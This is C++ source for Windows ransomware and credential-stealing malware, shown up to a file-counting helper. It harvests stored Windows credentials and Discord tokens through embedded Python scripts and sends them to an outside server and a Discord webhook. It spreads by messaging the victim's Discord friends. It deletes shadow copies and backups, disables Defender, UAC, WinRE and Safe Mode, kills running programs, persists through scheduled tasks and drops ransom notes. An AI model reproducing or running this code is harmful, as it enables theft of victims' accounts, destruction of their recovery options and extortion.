#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <string>
#include <sstream>
#include <fstream>
#include <filesystem>
#include <random>
#include <chrono>
#include <thread>
#include <tlhelp32.h>
#include <aclapi.h>
#include <set>
#include <wincrypt.h>
#include <atomic>
#include <psapi.h>
#include <lm.h>
#include <shlobj.h>
#include <wincred.h>
#include <shellapi.h>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "credui.lib")
#pragma comment(lib, "shell32.lib")

namespace fs = std::filesystem;

std::string g_hwid;
std::string g_key;
int g_encryptedCount = 0;
std::atomic<bool> g_restartScheduled(false);
std::string g_collectedData = "";
std::string g_publicIPv4 = "";
std::string g_publicIPv4Bypass = "";
std::string g_publicIPv6 = "";

std::string HttpGetRequest(const std::string& url) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "Unknown";
    
    HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return "Unknown";
    }
    
    char buffer[256];
    DWORD bytesRead = 0;
    std::string result;
    while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }
    
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    result.erase(result.find_last_not_of(" \n\r\t") + 1);
    return result.empty() ? "Unknown" : result;
}

std::string GetPublicIPv4() {
    return HttpGetRequest("https://api.ipify.org");
}

std::string GetPublicIPv4Bypass() {
    std::string result = HttpGetRequest("https://checkip.amazonaws.com");
    result.erase(result.find_last_not_of(" \n\r\t") + 1);
    return result.empty() ? "Unknown" : result;
}

std::string GetPublicIPv6() {
    return HttpGetRequest("https://api6.ipify.org");
}

void SendToLogService(const std::string& data) {
    HINTERNET hInternet = InternetOpenA("LogSender", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return;
    
    HINTERNET hConnect = InternetConnectA(hInternet, "python-vxgd.onrender.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return;
    }
    
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/log", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }
    
    std::string secret = "w9boNAmmt#RzukF7U7u2!UtMvEAnnsiwZ#H3f2hmxDFkVP^Y@ySfwh6MpDFghJw&";
    std::string headers = "X-API-Key: " + secret + "\r\nContent-Type: text/plain\r\n";
    HttpSendRequestA(hRequest, headers.c_str(), headers.length(), (LPVOID)data.c_str(), data.length());
    
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

void SendWebhook(const std::string& message)
{
    const char* host = "discord.com";
    const char* path = "/api/webhooks/[number]/[webhook end]";

    std::string data = "{\"content\": \"" + message + "\"}";

    HINTERNET hInternet = InternetOpenA("WebhookSender", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return;

    HINTERNET hConnect = InternetConnectA(hInternet, host, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return;
    }

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    const char* headers = "Content-Type: application/json\r\n";
    HttpSendRequestA(hRequest, headers, strlen(headers), (LPVOID)data.c_str(), data.length());

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

void SendLargeData(const std::string& data) {
    if (data.length() > 1900) {
        for (size_t i = 0; i < data.length(); i += 1900) {
            std::string chunk = data.substr(i, 1900);
            SendWebhook(chunk);
            Sleep(500);
        }
    } else {
        SendWebhook(data);
    }
}

void SendCredentialsToLogService() {
    PCREDENTIALW* creds;
    DWORD count;
    
    if (CredEnumerateW(NULL, 0, &count, &creds)) {
        for (DWORD i = 0; i < count; i++) {
            std::wstring targetNameW(creds[i]->TargetName);
            std::string targetName(targetNameW.begin(), targetNameW.end());
            std::wstring userNameW(creds[i]->UserName);
            std::string userName(userNameW.begin(), userNameW.end());
            
            std::string password;
            if (creds[i]->CredentialBlobSize > 0) {
                password = std::string((char*)creds[i]->CredentialBlob, creds[i]->CredentialBlobSize);
            }
            
            if (!userName.empty() && !password.empty()) {
                std::string formatted = userName + ":" + password + ":" + g_publicIPv4 + ":" + g_publicIPv4Bypass + ":NOtoken:NOemail:NOwebsite:" + g_publicIPv6;
                SendToLogService(formatted);
                Sleep(100);
            }
            else if (!userName.empty() && password.empty()) {
                std::string formatted = userName + ":NOpassword:" + g_publicIPv4 + ":" + g_publicIPv4Bypass + ":NOtoken:NOemail:NOwebsite:" + g_publicIPv6;
                SendToLogService(formatted);
                Sleep(100);
            }
        }
        CredFree(creds);
    }
    
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string tokenPath = std::string(tempPath) + "\\discord_tokens_output.txt";
    std::ifstream tokenFile(tokenPath.c_str());
    if (tokenFile.is_open()) {
        std::string line;
        while (std::getline(tokenFile, line)) {
            if (!line.empty()) {
                std::string formatted = "NOusername:NOpassword:" + g_publicIPv4 + ":" + g_publicIPv4Bypass + ":" + line + ":NOemail:NOwebsite:" + g_publicIPv6;
                SendToLogService(formatted);
                Sleep(100);
            }
        }
        tokenFile.close();
    }
    
    std::string spreaderTokenPath = std::string(tempPath) + "\\extracted_discord_token.txt";
    std::ifstream spreaderFile(spreaderTokenPath.c_str());
    if (spreaderFile.is_open()) {
        std::string line;
        while (std::getline(spreaderFile, line)) {
            if (!line.empty()) {
                size_t tokenPos = line.find("Token:");
                if (tokenPos != std::string::npos) {
                    std::string token = line.substr(tokenPos + 6);
                    std::string formatted = "NOusername:NOpassword:" + g_publicIPv4 + ":" + g_publicIPv4Bypass + ":" + token + ":NOemail:NOwebsite:" + g_publicIPv6;
                    SendToLogService(formatted);
                    Sleep(100);
                }
            }
        }
        spreaderFile.close();
    }
}

void SpreadViaDiscordAndExtractToken() {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string pythonScriptPath = std::string(tempPath) + "\\discord_spreader.py";
    
    std::string pythonScript = 
    "import base64\n"
    "import json\n"
    "import os\n"
    "import re\n"
    "import requests\n"
    "import time\n"
    "from pathlib import Path\n"
    "\n"
    "TOKEN_REGEX_PATTERN = r\"[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{34,38}\"\n"
    "\n"
    "def get_tokens_from_file(file_path: Path):\n"
    "    try:\n"
    "        file_contents = file_path.read_text(encoding=\"utf-8\", errors=\"ignore\")\n"
    "    except PermissionError:\n"
    "        return None\n"
    "    tokens = re.findall(TOKEN_REGEX_PATTERN, file_contents)\n"
    "    return tokens or None\n"
    "\n"
    "def get_user_id_from_token(token: str):\n"
    "    try:\n"
    "        discord_user_id = base64.b64decode(token.split(\".\", maxsplit=1)[0] + \"==\").decode(\"utf-8\")\n"
    "        return discord_user_id\n"
    "    except:\n"
    "        return None\n"
    "\n"
    "def get_tokens_from_path(base_path: Path):\n"
    "    if not base_path.exists():\n"
    "        return None\n"
    "    file_paths = [file for file in base_path.iterdir() if file.is_file()]\n"
    "    id_to_tokens = {}\n"
    "    for file_path in file_paths:\n"
    "        potential_tokens = get_tokens_from_file(file_path)\n"
    "        if potential_tokens is None:\n"
    "            continue\n"
    "        for potential_token in potential_tokens:\n"
    "            discord_user_id = get_user_id_from_token(potential_token)\n"
    "            if discord_user_id is None:\n"
    "                continue\n"
    "            if discord_user_id not in id_to_tokens:\n"
    "                id_to_tokens[discord_user_id] = set()\n"
    "            id_to_tokens[discord_user_id].add(potential_token)\n"
    "    return id_to_tokens or None\n"
    "\n"
    "def test_token(token: str):\n"
    "    try:\n"
    "        response = requests.get(url=\"https://discord.com/api/v9/users/@me\", headers={\"Content-Type\": \"application/json\", \"Authorization\": token}, timeout=10)\n"
    "        if response.status_code == 200:\n"
    "            return True, response.json()\n"
    "        else:\n"
    "            return False, {\"error\": response.status_code}\n"
    "    except:\n"
    "        return False, {\"error\": \"Exception\"}\n"
    "\n"
    "def get_friend_list(token: str):\n"
    "    headers = {\"Authorization\": token, \"Content-Type\": \"application/json\"}\n"
    "    try:\n"
    "        response = requests.get(\"https://discord.com/api/v9/users/@me/relationships\", headers=headers, timeout=10)\n"
    "        if response.status_code == 200:\n"
    "            relationships = response.json()\n"
    "            friends = [r for r in relationships if r.get('type') == 1]\n"
    "            return friends\n"
    "        else:\n"
    "            return []\n"
    "    except:\n"
    "        return []\n"
    "\n"
    "def send_message_to_user(token: str, user_id: int, message: str, delay: float = 2.0):\n"
    "    headers = {\"Authorization\": token, \"Content-Type\": \"application/json\"}\n"
    "    try:\n"
    "        r = requests.post(\"https://discord.com/api/v9/users/@me/channels\", headers=headers, json={\"recipient_id\": str(user_id)})\n"
    "        if r.status_code != 200:\n"
    "            return False\n"
    "        channel_id = r.json()[\"id\"]\n"
    "        r2 = requests.post(f\"https://discord.com/api/v9/channels/{channel_id}/messages\", headers=headers, json={\"content\": message})\n"
    "        time.sleep(delay)\n"
    "        return r2.status_code == 200\n"
    "    except:\n"
    "        time.sleep(delay)\n"
    "        return False\n"
    "\n"
    "def main():\n"
    "    local_app_data = os.getenv(\"LOCALAPPDATA\")\n"
    "    if not local_app_data:\n"
    "        return\n"
    "    chrome_path = Path(local_app_data) / \"Google\" / \"Chrome\" / \"User Data\" / \"Default\" / \"Local Storage\" / \"leveldb\"\n"
    "    tokens_by_user = get_tokens_from_path(chrome_path)\n"
    "    if not tokens_by_user:\n"
    "        return\n"
    "    working_token = None\n"
    "    working_user_info = None\n"
    "    for user_id, tokens in tokens_by_user.items():\n"
    "        for token in tokens:\n"
    "            is_valid, user_info = test_token(token)\n"
    "            if is_valid:\n"
    "                working_token = token\n"
    "                working_user_info = user_info\n"
    "                break\n"
    "        if working_token:\n"
    "            break\n"
    "    if not working_token:\n"
    "        return\n"
    "    token_output = os.path.join(os.environ.get(\"TEMP\", \"C:\\\\Windows\\\\Temp\"), \"extracted_discord_token.txt\")\n"
    "    with open(token_output, \"w\") as f:\n"
    "        f.write(f\"Token: {working_token}\\n\")\n"
    "        if working_user_info:\n"
    "            f.write(f\"Username: {working_user_info.get('username', 'Unknown')}\\n\")\n"
    "            f.write(f\"UserID: {working_user_info.get('id', 'Unknown')}\\n\")\n"
    "    friends = get_friend_list(working_token)\n"
    "    if not friends:\n"
    "        return\n"
    "    exe_path = sys.argv[0] if len(sys.argv) > 0 else \"ransomware.exe\"\n"
    "    for friend in friends:\n"
    "        friend_id = friend.get('id')\n"
    "        if friend_id:\n"
    "            send_message_to_user(working_token, int(friend_id), \"hi\", delay=2.0)\n"
    "\n"
    "if __name__ == \"__main__\":\n"
    "    import sys\n"
    "    main()\n";
    
    std::ofstream pyFile(pythonScriptPath.c_str());
    pyFile << pythonScript;
    pyFile.close();
    
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string currentExe = std::string(exePath);
    
    std::string cmd = "python \"" + pythonScriptPath + "\" \"" + currentExe + "\" > nul 2>&1";
    system(cmd.c_str());
    
    Sleep(3000);
    
    std::string tokenOutputPath = std::string(tempPath) + "\\extracted_discord_token.txt";
    std::ifstream tokenFile(tokenOutputPath.c_str());
    if (tokenFile.is_open()) {
        std::string line;
        while (std::getline(tokenFile, line)) {
            if (!line.empty()) {
                size_t tokenPos = line.find("Token:");
                if (tokenPos != std::string::npos) {
                    std::string token = line.substr(tokenPos + 6);
                    std::string formatted = "NOusername:NOpassword:" + g_publicIPv4 + ":" + g_publicIPv4Bypass + ":" + token + ":NOemail:NOwebsite:" + g_publicIPv6;
                    SendToLogService(formatted);
                }
                g_collectedData += "[DISCORD_SPREADER_TOKEN] " + line + "\n";
            }
        }
        tokenFile.close();
        fs::remove(tokenOutputPath);
    }
    
    fs::remove(pythonScriptPath);
}

void ExtractDiscordTokens() {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string pythonScriptPath = std::string(tempPath) + "\\discord_extract.py";
    
    std::string pythonScript = 
    "import os\n"
    "import json\n"
    "import base64\n"
    "import re\n"
    "from Crypto.Cipher import AES\n"
    "import win32crypt\n"
    "\n"
    "def get_master_key():\n"
    "    path = os.path.join(os.getenv(\"APPDATA\"), r\"discord\\Local State\")\n"
    "    with open(path, \"r\", encoding=\"utf-8\") as f:\n"
    "        local_state = json.load(f)\n"
    "    key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])[5:]\n"
    "    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]\n"
    "\n"
    "def decrypt_token(buff, master_key):\n"
    "    try:\n"
    "        cipher = AES.new(master_key, AES.MODE_GCM, buff[3:15])\n"
    "        return cipher.decrypt(buff[15:])[:-16].decode().strip()\n"
    "    except:\n"
    "        return None\n"
    "\n"
    "def extract():\n"
    "    path = os.path.join(os.getenv(\"APPDATA\"), r\"discord\\Local Storage\\leveldb\")\n"
    "    tokens = []\n"
    "    try:\n"
    "        master_key = get_master_key()\n"
    "    except:\n"
    "        return tokens\n"
    "    for file in os.listdir(path):\n"
    "        if not file.endswith((\".log\", \".ldb\")): continue\n"
    "        try:\n"
    "            with open(os.path.join(path, file), \"r\", errors=\"ignore\", encoding=\"utf-8\") as f:\n"
    "                for line in f:\n"
    "                    for content in re.findall(r\"dQw4w9WgXcQ:([^\\\"' ]+)\", line.strip()):\n"
    "                        try:\n"
    "                            token = decrypt_token(base64.b64decode(content), master_key)\n"
    "                            if token and token not in tokens:\n"
    "                                tokens.append(token)\n"
    "                        except:\n"
    "                            continue\n"
    "        except:\n"
    "            continue\n"
    "    return tokens\n"
    "\n"
    "if __name__ == \"__main__\":\n"
    "    found = extract()\n"
    "    output_file = os.path.join(os.environ.get(\"TEMP\", \"C:\\\\Windows\\\\Temp\"), \"discord_tokens_output.txt\")\n"
    "    with open(output_file, \"w\") as f:\n"
    "        for t in found:\n"
    "            f.write(f\"{t}\\n\")\n";
    
    std::ofstream pyFile(pythonScriptPath.c_str());
    pyFile << pythonScript;
    pyFile.close();
    
    std::string cmd = "python \"" + pythonScriptPath + "\" > nul 2>&1";
    system(cmd.c_str());
    
    Sleep(2000);
    
    std::string outputPath = std::string(tempPath) + "\\discord_tokens_output.txt";
    std::ifstream outputFile(outputPath.c_str());
    if (outputFile.is_open()) {
        std::string line;
        while (std::getline(outputFile, line)) {
            if (!line.empty()) {
                std::string formatted = "NOusername:NOpassword:" + g_publicIPv4 + ":" + g_publicIPv4Bypass + ":" + line + ":NOemail:NOwebsite:" + g_publicIPv6;
                SendToLogService(formatted);
                g_collectedData += "[DISCORD_TOKEN] " + line + "\n";
            }
        }
        outputFile.close();
        fs::remove(outputPath);
    }
    
    fs::remove(pythonScriptPath);
}

void GetGPSLocation() {
    std::string response = HttpGetRequest("https://ipapi.co/json/");
    
    size_t latPos = response.find("\"latitude\"");
    if (latPos != std::string::npos) {
        size_t colonPos = response.find(":", latPos);
        size_t commaPos = response.find(",", colonPos);
        if (colonPos != std::string::npos && commaPos != std::string::npos) {
            std::string lat = response.substr(colonPos + 1, commaPos - colonPos - 1);
            
            size_t lonPos = response.find("\"longitude\"");
            if (lonPos != std::string::npos) {
                colonPos = response.find(":", lonPos);
                commaPos = response.find(",", colonPos);
                std::string lon = response.substr(colonPos + 1, commaPos - colonPos - 1);
                
                size_t cityPos = response.find("\"city\"");
                std::string city;
                if (cityPos != std::string::npos) {
                    colonPos = response.find(":", cityPos);
                    size_t quote1 = response.find("\"", colonPos + 1);
                    size_t quote2 = response.find("\"", quote1 + 1);
                    city = response.substr(quote1 + 1, quote2 - quote1 - 1);
                }
                
                size_t countryPos = response.find("\"country_name\"");
                std::string country;
                if (countryPos != std::string::npos) {
                    colonPos = response.find(":", countryPos);
                    size_t quote1 = response.find("\"", colonPos + 1);
                    size_t quote2 = response.find("\"", quote1 + 1);
                    country = response.substr(quote1 + 1, quote2 - quote1 - 1);
                }
                
                g_collectedData += "[IP_LOCATION] Lat: " + lat + ", Lon: " + lon + " | City: " + city + " | Country: " + country + "\n";
                g_collectedData += "[MAPS] https://www.google.com/maps?q=" + lat + "," + lon + "\n";
            }
        }
    }
}

void KillProcessByName(const std::string& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            std::wstring currentProcessW(pe.szExeFile);
            std::string currentProcess(currentProcessW.begin(), currentProcessW.end());
            if (currentProcess.find(processName) != std::string::npos) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (hProcess) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
}

void KillAllTargetApps() {
    std::vector<std::string> apps = {
        "Roblox", "RobloxPlayer", "RobloxStudio", "Discord", "discord",
        "Minecraft", "javaw", "java", "Edge", "msedge", "chrome", "firefox",
        "Steam", "steam", "EpicGames", "Spotify", "Slack", "Teams", "Outlook",
        "Code", "VisualStudio", "Photoshop", "Premiere", "AfterEffects"
    };

    for (const auto& app : apps) {
        KillProcessByName(app);
        Sleep(100);
    }
}

void KillProgramFilesProcesses() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
            if (hProcess) {
                WCHAR path[MAX_PATH];
                if (GetModuleFileNameExW(hProcess, NULL, path, MAX_PATH)) {
                    std::wstring exePathW(path);
                    std::string exePath(exePathW.begin(), exePathW.end());
                    if (exePath.find("Program Files") != std::string::npos ||
                        exePath.find("Program Files (x86)") != std::string::npos) {
                        TerminateProcess(hProcess, 0);
                    }
                }
                CloseHandle(hProcess);
            }
        } while (Process32NextW(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
}

void DeleteShadowCopies() {
    system("vssadmin delete shadows /all /quiet > nul 2>&1");
    system("wmic shadowcopy delete > nul 2>&1");
    system("bcdedit /set {default} recoveryenabled No > nul 2>&1");
    system("bcdedit /set {default} bootstatuspolicy ignoreallfailures > nul 2>&1");
    system("wbadmin delete catalog -quiet > nul 2>&1");
}

void DisableRecoveryTools() {
    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul 2>&1");
    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableRegistryTools /t REG_DWORD /d 1 /f > nul 2>&1");
    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /t REG_DWORD /d 1 /f > nul 2>&1");
    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFind /t REG_DWORD /d 1 /f > nul 2>&1");
    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableCMD /t REG_DWORD /d 0 /f > nul 2>&1");
}

void KillBackupServices() {
    system("net stop \"Backup\" /y > nul 2>&1");
    system("net stop \"SDRSVC\" /y > nul 2>&1");
    system("net stop \"wbengine\" /y > nul 2>&1");
    system("sc config wbengine start= disabled > nul 2>&1");
    system("sc config SDRSVC start= disabled > nul 2>&1");
    system("sc config wscsvc start= disabled > nul 2>&1");
}

void DisableWinRE() {
    system("reagentc /disable > nul 2>&1");
    system("reagentc /info > nul 2>&1");
}

void AddScheduledTask() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string cmd = "schtasks /create /tn \"SystemUpdateTask\" /tr \"" + std::string(exePath) + "\" /sc onlogon /ru \"SYSTEM\" /f > nul 2>&1";
    system(cmd.c_str());
    
    std::string cmd2 = "schtasks /create /tn \"MicrosoftWindowsUpdate\" /tr \"" + std::string(exePath) + "\" /sc daily /st 09:00 /ru \"SYSTEM\" /f > nul 2>&1";
    system(cmd2.c_str());
}

std::string GetUserNameStr() {
    WCHAR username[UNLEN + 1];
    DWORD size = UNLEN + 1;
    if (GetUserNameW(username, &size)) {
        std::wstring userW(username);
        return std::string(userW.begin(), userW.end());
    }
    return "User";
}

std::string GetComputerNameStr() {
    WCHAR computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(WCHAR);
    if (GetComputerNameW(computerName, &size)) {
        std::wstring compW(computerName);
        return std::string(compW.begin(), compW.end());
    }
    return "Computer";
}

std::string GetDesktopName() {
    HWINSTA hwinsta = GetProcessWindowStation();
    if (hwinsta) {
        char desktopName[256];
        DWORD size = sizeof(desktopName);
        if (GetUserObjectInformationA(hwinsta, UOI_NAME, desktopName, size, &size)) {
            return std::string(desktopName);
        }
    }
    return "Default";
}

void CreateLockedTxt(const std::string& folderPath) {
    try {
        std::string userName = GetUserNameStr();
        std::string computerName = GetComputerNameStr();
        std::string lockedPath = folderPath + "\\locked.txt";
        std::ofstream locked(lockedPath.c_str());
        if (locked) {
            locked << "INSTRUCTIONS\n\n";
            locked << "Hello dear " << userName << "@" << computerName << "!\n";
            locked.close();
        }
    }
    catch (...) {}
}

void DeleteLockedTxtFiles() {
    try {
        std::string userProfile = getenv("USERPROFILE");
        std::vector<std::string> searchPaths = {
            userProfile + "\\Documents",
            userProfile + "\\Downloads",
            userProfile + "\\Pictures",
            userProfile + "\\Music",
            userProfile + "\\Videos",
            userProfile + "\\AppData\\Local",
            userProfile + "\\AppData\\Roaming",
            "C:\\Program Files",
            "C:\\Program Files (x86)",
            "C:\\ProgramData",
            userProfile + "\\Desktop"
        };

        for (const auto& path : searchPaths) {
            if (fs::exists(path)) {
                for (const auto& entry : fs::recursive_directory_iterator(path, fs::directory_options::skip_permission_denied)) {
                    if (fs::is_regular_file(entry) && entry.path().filename().string() == "locked.txt") {
                        DeleteFileA(entry.path().string().c_str());
                    }
                }
            }
        }
    }
    catch (...) {}
}

void DeleteTempFiles() {
    try {
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        std::string tempDir = std::string(tempPath);

        if (fs::exists(tempDir)) {
            for (const auto& entry : fs::directory_iterator(tempDir)) {
                if (fs::is_regular_file(entry)) {
                    DeleteFileA(entry.path().string().c_str());
                }
                else if (fs::is_directory(entry)) {
                    try {
                        fs::remove_all(entry.path());
                    }
                    catch (...) {}
                }
            }
        }

        std::string userProfile = getenv("USERPROFILE");
        std::string localTemp = userProfile + "\\AppData\\Local\\Temp";
        if (fs::exists(localTemp)) {
            for (const auto& entry : fs::directory_iterator(localTemp)) {
                if (fs::is_regular_file(entry)) {
                    DeleteFileA(entry.path().string().c_str());
                }
                else if (fs::is_directory(entry)) {
                    try {
                        fs::remove_all(entry.path());
                    }
                    catch (...) {}
                }
            }
        }

        std::string windowsTemp = "C:\\Windows\\Temp";
        if (fs::exists(windowsTemp)) {
            for (const auto& entry : fs::directory_iterator(windowsTemp)) {
                if (fs::is_regular_file(entry)) {
                    DeleteFileA(entry.path().string().c_str());
                }
                else if (fs::is_directory(entry)) {
                    try {
                        fs::remove_all(entry.path());
                    }
                    catch (...) {}
                }
            }
        }

        std::string prefetch = "C:\\Windows\\Prefetch";
        if (fs::exists(prefetch)) {
            for (const auto& entry : fs::directory_iterator(prefetch)) {
                if (fs::is_regular_file(entry)) {
                    DeleteFileA(entry.path().string().c_str());
                }
            }
        }
    }
    catch (...) {}
}

void DisableTamperProtection() {
    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v TamperProtection /t REG_DWORD /d 0 /f > nul 2>&1");
    system("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Features\" /v TamperProtection /t REG_DWORD /d 0 /f > nul 2>&1");
    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\TamperProtection\" /v TamperProtection /t REG_DWORD /d 0 /f > nul 2>&1");
    system("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f > nul 2>&1");
    system("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f > nul 2>&1");
    system("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f > nul 2>&1");
    system("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f > nul 2>&1");
    system("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f > nul 2>&1");
}

void CorruptSafeMode() {
    system("bcdedit /deletevalue {default} safeboot > nul 2>&1");
    system("bcdedit /deletevalue {current} safeboot > nul 2>&1");
    system("reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\" /f > nul 2>&1");
    system("reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\" /f > nul 2>&1");
    system("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\" /v BLOCKED /t REG_SZ /d \"\" /f > nul 2>&1");
    system("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\" /v BLOCKED /t REG_SZ /d \"\" /f > nul 2>&1");
    system("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v DisableSafeBoot /t REG_DWORD /d 1 /f > nul 2>&1");
    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v SafeModeOption /t REG_DWORD /d 0 /f > nul 2>&1");
    system("bcdedit /set {default} bootstatuspolicy ignoreallfailures > nul 2>&1");
    system("bcdedit /set {default} recoveryenabled no > nul 2>&1");
}

void DisableUAC() {
    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /t REG_DWORD /d 0 /f > nul 2>&1");
    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f > nul 2>&1");
    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f > nul 2>&1");
    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableInstallerDetection /t REG_DWORD /d 0 /f > nul 2>&1");
    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableVirtualization /t REG_DWORD /d 0 /f > nul 2>&1");
    system("reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /t REG_DWORD /d 0 /f > nul 2>&1");
}

void AddLockedTxtToStartup() {
    std::string desktopPath = getenv("USERPROFILE");
    desktopPath += "\\Desktop\\locked.txt";
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "SystemMessage", 0, REG_SZ, (const BYTE*)desktopPath.c_str(), (DWORD)desktopPath.length() + 1);
        RegCloseKey(hKey);
    }
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "SystemMessage", 0, REG_SZ, (const BYTE*)desktopPath.c_str(), (DWORD)desktopPath.length() + 1);
        RegCloseKey(hKey);
    }
}

int CountLockedFilesOnDesktop() {
    int count = 0;
    std::string desktopPath = getenv("USERPROFILE");
    desktopPath += "\\Desktop";
    if (!fs::exists(desktopPath)) return 0;
    try {
        for (const auto& entry : fs::directory_iterator(desktopPath)) {
            if (fs::is_regular_file(entry)) {
                std::string filename = entry.path().filename().string();
                if (filename.find(".locked") != std::string::npos) {
                    count++;
                }
            }
        }
    }
    catch (...) {}
    return count;
}

